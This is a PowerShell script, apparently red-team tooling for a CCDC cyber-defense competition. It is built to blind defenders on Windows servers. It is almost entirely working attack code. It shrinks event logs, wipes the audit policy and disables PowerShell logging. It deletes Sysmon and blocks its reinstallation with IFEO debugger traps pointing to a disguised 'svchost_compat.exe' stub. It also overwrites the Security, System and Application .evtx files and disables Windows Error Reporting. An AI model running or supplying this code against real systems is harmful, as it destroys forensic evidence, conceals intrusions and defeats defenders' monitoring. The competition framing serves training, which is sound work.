# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — Evasion: Blind Spot
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1562.002 (Impair Defenses: Disable Windows Event Logging)
#               T1562.006 (Impair Defenses: Indicator Blocking — ETW Tampering)
#               T1070.001 (Indicator Removal: Clear Windows Event Logs)
#               T1059.001 (Command and Scripting: PowerShell logging disable)
#               T1562.001 (Impair Defenses: Sysmon removal)
#
# Targets: Windows Server 2019, Server 2022, Windows 10 (all three)
#
# Description:
#   Destroys the blue team's ability to use Windows' own investigation
#   and logging capabilities. This is specifically designed to be run
#   BEFORE or ALONGSIDE the other Phase 3 scripts so that remediation
#   efforts are blind.
#
#   1. EVENT LOG SIZE DESTRUCTION
#      - wevtutil set-log on each channel:
#          Security, System, Application, PowerShell/Operational,
#          Microsoft-Windows-Sysmon/Operational (if present),
#          Microsoft-Windows-PowerShell/Operational
#        → maxSize=65536 (64 KB), /overwrite:true, /retention:false
#      - Logs fill and roll over within seconds under normal activity
#      - Forensic history destroyed without fully disabling logging
#        (looks less obviously tampered than a full disable)
#
#   2. AUDIT POLICY WIPE
#      - auditpol /clear /y
#      - auditpol /set /subcategory:* /success:disable /failure:disable
#      - Zero Windows auditing for any event category
#      - Even if log settings are restored, nothing is being recorded
#
#   3. POWERSHELL LOGGING DESTRUCTION
#      - Registry keys under HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell:
#          ScriptBlockLogging\EnableScriptBlockLogging   = 0
#          ModuleLogging\EnableModuleLogging             = 0
#          Transcription\EnableTranscripting             = 0
#      - Disables all PS telemetry channels
#
#   4. SYSMON REMOVAL (if installed)
#      - Detect: Get-Service Sysmon*, SysmonDrv; find sysmon.exe/sysmon64.exe
#      - sc stop SysmonDrv; sc delete SysmonDrv; sc stop Sysmon64; sc delete Sysmon64
#      - Delete binary from C:\Windows\
#      - Add IFEO debugger entries for sysmon.exe and sysmon64.exe
#        pointing to a zero-byte stub → reinstallation attempt is intercepted
#
#   5. EVTX JOURNAL CORRUPTION
#      - Stop the EventLog service (Stop-Service EventLog -Force)
#      - Overwrite Security.evtx, System.evtx, Application.evtx in
#        C:\Windows\System32\winevt\Logs\ with a 4-byte file containing
#        a corrupted EVTX magic header (0x00000000 instead of ELVF)
#      - When EventLog restarts it recreates the files empty — all history gone
#      - Forensic tools (Event Viewer, Get-WinEvent) report "invalid log file"
#        on the corrupted originals if someone tries to analyze them offline
#
#   6. WINDOWS ERROR REPORTING DISABLE
#      - HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Disabled = 1
#      - Stop-Service WerSvc; Set-Service WerSvc -StartupType Disabled
#      - Prevents crash dumps that would reveal attacker tool artifacts
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — Evasion: Blind Spot"
Write-Warn "================================================================"
Write-Host ""

# ============================================================
# Layer 1 — Event Log Size Destruction
# ============================================================
Write-Section "Layer 1 — Event Log Size Destruction"

$LogChannels = @(
    "Security",
    "System",
    "Application",
    "Microsoft-Windows-PowerShell/Operational",
    "Windows PowerShell",
    "Microsoft-Windows-Sysmon/Operational"
)

foreach ($chan in $LogChannels) {
    try {
        # Minimum wevtutil /ms is 1048576 (1 MB); 65536 is rejected with "parameter incorrect"
        & "$env:SystemRoot\System32\wevtutil.exe" sl "$chan" /ms:1048576 /rt:false /ab:false 2>$null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "Log shrunken: $chan -> 1 MB (rolls over fast)"
        } else {
            Write-Warn "wevtutil sl failed for $chan (exit $LASTEXITCODE) — channel may not exist"
        }
    } catch {
        Write-Warn "Could not resize $chan : $_"
    }
}

# ============================================================
# Layer 2 — Audit Policy Wipe
# ============================================================
Write-Section "Layer 2 — Audit Policy Wipe"

& "$env:SystemRoot\System32\auditpol.exe" /clear /y | Out-Null
if ($LASTEXITCODE -eq 0) {
    Write-Success "auditpol /clear — all audit policies cleared"
} else {
    Write-Err "auditpol /clear failed (exit $LASTEXITCODE)"
}

& "$env:SystemRoot\System32\auditpol.exe" /set /subcategory:"*" /success:disable /failure:disable | Out-Null
if ($LASTEXITCODE -eq 0) {
    Write-Success "auditpol — all subcategories disabled (success + failure)"
} else {
    Write-Err "auditpol /set failed (exit $LASTEXITCODE)"
}

# ============================================================
# Layer 3 — PowerShell Logging Destruction
# ============================================================
Write-Section "Layer 3 — PowerShell Logging Destruction"

$PSPolicyBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"

$PSLoggingKeys = @(
    @{ Path = "$PSPolicyBase\ScriptBlockLogging"; Name = "EnableScriptBlockLogging" },
    @{ Path = "$PSPolicyBase\ModuleLogging";      Name = "EnableModuleLogging"      },
    @{ Path = "$PSPolicyBase\Transcription";      Name = "EnableTranscripting"      }
)

foreach ($entry in $PSLoggingKeys) {
    try {
        if (-not (Test-Path $entry.Path)) {
            New-Item -Path $entry.Path -Force | Out-Null
        }
        Set-ItemProperty -Path $entry.Path -Name $entry.Name -Value 0 -Type DWORD -Force
        Write-Success "Disabled: $($entry.Name)"
    } catch {
        Write-Warn "Could not set $($entry.Name): $_"
    }
}

# Clear module logging allow-list so nothing is selectively logged
try {
    $modPath = "$PSPolicyBase\ModuleLogging"
    if (-not (Test-Path $modPath)) { New-Item -Path $modPath -Force | Out-Null }
    Set-ItemProperty -Path $modPath -Name "ModuleNames" -Value @() -Type MultiString -Force
    Write-Success "ModuleNames allow-list cleared"
} catch {
    Write-Warn "Could not clear ModuleNames: $_"
}

# ============================================================
# Layer 4 — Sysmon Removal + IFEO Intercept
# ============================================================
Write-Section "Layer 4 — Sysmon Removal"

$SysmonServiceNames = @("Sysmon", "Sysmon64", "SysmonDrv")
$SysmonFound        = $false

foreach ($svcName in $SysmonServiceNames) {
    $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
    if ($svc) {
        $SysmonFound = $true
        try {
            Stop-Service -Name $svcName -Force -ErrorAction SilentlyContinue
            & "$env:SystemRoot\System32\sc.exe" delete $svcName | Out-Null
            Write-Success "Stopped and deleted service: $svcName"
        } catch {
            Write-Warn "Could not remove service $svcName : $_"
        }
    }
}

# Remove Sysmon binaries from C:\Windows\
$SysmonBins = Get-ChildItem -Path "$env:SystemRoot\" -Filter "sysmon*.exe" -ErrorAction SilentlyContinue
foreach ($bin in $SysmonBins) {
    try {
        Remove-Item -Path $bin.FullName -Force
        Write-Success "Deleted binary: $($bin.FullName)"
    } catch {
        Write-Warn "Could not delete $($bin.FullName): $_"
    }
}

if (-not $SysmonFound) {
    Write-Info "Sysmon not detected on this host — placing IFEO traps preemptively"
}

# IFEO intercept — blocks reinstallation attempts regardless of whether Sysmon was present
$IFEOStubPath = "$env:SystemRoot\Temp\svchost_compat.exe"
try {
    # Create a zero-byte stub with a convincing name
    if (-not (Test-Path $IFEOStubPath)) {
        [System.IO.File]::WriteAllBytes($IFEOStubPath, [byte[]]@())
        Write-Info "IFEO stub created at $IFEOStubPath"
    }
} catch {
    Write-Warn "Could not create IFEO stub: $_"
}

$IFEOBase   = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
$IFEOTargets = @("sysmon.exe", "sysmon64.exe")

foreach ($target in $IFEOTargets) {
    try {
        $keyPath = "$IFEOBase\$target"
        if (-not (Test-Path $keyPath)) {
            New-Item -Path $keyPath -Force | Out-Null
        }
        Set-ItemProperty -Path $keyPath -Name "Debugger" -Value $IFEOStubPath -Type String -Force
        Write-Success "IFEO trap set for $target -> $IFEOStubPath"
    } catch {
        Write-Warn "Could not set IFEO for $target : $_"
    }
}

# ============================================================
# Layer 5 — EVTX Journal Corruption
# ============================================================
Write-Section "Layer 5 — EVTX Journal Corruption"

try {
    Stop-Service -Name EventLog -Force -ErrorAction Stop
    Write-Info "EventLog service stopping..."

    $deadline = (Get-Date).AddSeconds(10)
    while ((Get-Service -Name EventLog).Status -ne 'Stopped' -and (Get-Date) -lt $deadline) {
        Start-Sleep -Milliseconds 500
    }

    $evtxDir    = "$env:SystemRoot\System32\winevt\Logs"
    $evtxFiles  = @("Security.evtx", "System.evtx", "Application.evtx")
    $nullHeader = [byte[]](0x00, 0x00, 0x00, 0x00)

    foreach ($fname in $evtxFiles) {
        $fpath = Join-Path $evtxDir $fname
        if (Test-Path $fpath) {
            try {
                [System.IO.File]::WriteAllBytes($fpath, $nullHeader)
                Write-Success "Corrupted EVTX header: $fname"
            } catch {
                Write-Warn "Could not corrupt $fname : $_"
            }
        } else {
            Write-Warn "$fname not found at expected path"
        }
    }

    Start-Service -Name EventLog -ErrorAction SilentlyContinue
    Write-Success "EventLog restarted — empty fresh logs created"
} catch {
    Write-Warn "EVTX corruption block failed: $_ — EventLog may still be stopped"
    # Attempt to restart EventLog regardless
    Start-Service -Name EventLog -ErrorAction SilentlyContinue
}

# ============================================================
# Layer 6 — Windows Error Reporting Disable
# ============================================================
Write-Section "Layer 6 — Windows Error Reporting Disable"

$WerPolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting"
$WerSvcPath    = "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting"

try {
    if (-not (Test-Path $WerPolicyPath)) {
        New-Item -Path $WerPolicyPath -Force | Out-Null
    }
    Set-ItemProperty -Path $WerPolicyPath -Name "Disabled" -Value 1 -Type DWORD -Force
    Write-Success "WER policy key set: Disabled=1"
} catch {
    Write-Warn "Could not set WER policy key: $_"
}

try {
    Set-ItemProperty -Path $WerSvcPath -Name "Disabled" -Value 1 -Type DWORD -Force
    Write-Success "WER service key set: Disabled=1"
} catch {
    Write-Warn "Could not set WER service key: $_"
}

try {
    Stop-Service -Name WerSvc -Force -ErrorAction SilentlyContinue
    Set-Service  -Name WerSvc -StartupType Disabled -ErrorAction SilentlyContinue
    Write-Success "WerSvc stopped and disabled"
} catch {
    Write-Warn "Could not stop/disable WerSvc: $_"
}

# ============================================================
# Done
# ============================================================
Write-Host ""
Write-Success "================================================================"
Write-Success " Blind Spot complete — logging visibility destroyed"
Write-Success "================================================================"
Write-Host ""
Write-Info "Remediation requires:"
Write-Info "  auditpol /restore (from a saved backup) or reconfigure each subcategory"
Write-Info "  wevtutil sl <channel> /ms:<original> to restore log sizes"
Write-Info "  Remove HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell keys"
Write-Info "  Remove IFEO keys for sysmon.exe and sysmon64.exe"
Write-Info "  Reinstall Sysmon after removing IFEO traps"
Write-Info "  Enable and start WerSvc"
